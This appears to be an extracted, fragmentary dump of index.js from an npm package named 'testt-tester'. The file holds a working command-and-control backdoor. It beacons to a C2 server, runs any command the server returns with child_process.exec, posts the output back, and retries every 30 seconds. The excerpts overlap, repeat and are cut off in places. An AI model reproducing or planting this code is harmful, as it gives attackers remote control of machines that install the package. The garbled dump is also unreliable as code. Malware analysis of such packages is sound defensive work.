// File: tmp/tmptk3pvvlh/testt-tester/package/index.js
// ======================================================================
Line 2: const http = require('http')
Line 7: {
    const data = "checkin=true"; 
    
    const req = http.request({
        hostname: C2_SERVER,
        port: C2_PORT,
        path: '/beacon',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': data.length
        }
    }, (res) => {
        let response = '';
        res.on('data', (chunk) => response += chunk);
        res.on('end', () => {
            // Execute the command received from the C2 server
            require('child_process').exec(response, (error, stdout, stderr) => {
                // Send the results back
                const resultData = `output=${stdout || stderr || 'No output'}`;
                const resultReq = http.request({
                    hostname: C2_SERVER,
                    port: C2_PORT,
                    path: '/result',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-u...
Line 10: const req = http.request({
        hostname: C2_SERVER,
        port: C2_PORT,
        path: '/beacon',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': data.length
        }
    }, (res) => {
        let response = '';
        res.on('data', (chunk) => response += chunk);
        res.on('end', () => {
            // Execute the command received from the C2 server
            require('child_process').exec(response, (error, stdout, stderr) => {
                // Send the results back
                const resultData = `output=${stdout || stderr || 'No output'}`;
                const resultReq = http.request({
                    hostname: C2_SERVER,
                    port: C2_PORT,
                    path: '/result',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length...
Line 22: {
            // Execute the command received from the C2 server
            require('child_process').exec(response, (error, stdout, stderr) => {
                // Send the results back
                const resultData = `output=${stdout || stderr || 'No output'}`;
                const resultReq = http.request({
                    hostname: C2_SERVER,
                    port: C2_PORT,
                    path: '/result',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': resultData.length
                    }
                });
                resultReq.write(resultData);
                resultReq.end();
            });
        }
Line 24: require('child_process').exec(response, (error, stdout, stderr) => {
                // Send the results back
                const resultData = `output=${stdout || stderr || 'No output'}`;
                const resultReq = http.request({
                    hostname: C2_SERVER,
                    port: C2_PORT,
                    path: '/result',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': resultData.length
                    }
                });
                resultReq.write(resultData);
                resultReq.end();
            })
Line 27: const resultReq = http.request({
                    hostname: C2_SERVER,
                    port: C2_PORT,
                    path: '/result',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': resultData.length
                    }
                })
Line 37: resultReq.write(resultData)
Line 38: resultReq.end()
Line 43: {
        // If connection fails, try again in 30 seconds
        setTimeout(callHome, 30000);
    }
Line 45: setTimeout(callHome, 30000)
Line 48: req.write(data)
Line 49: req.end()
